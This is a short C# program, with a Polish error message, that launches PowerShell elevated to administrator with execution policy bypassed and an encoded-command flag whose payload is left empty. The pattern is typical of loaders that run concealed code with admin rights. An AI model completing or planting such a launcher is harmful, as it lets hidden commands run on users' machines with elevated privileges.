using System;
using System.Diagnostics;

class Program
{
    static void Main()
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -ExecutionPolicy Bypass -e ",
                Verb = "runas", 
                UseShellExecute = true 
            };

            Process.Start(psi);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Błąd: " + ex.Message);
        }
    }
}
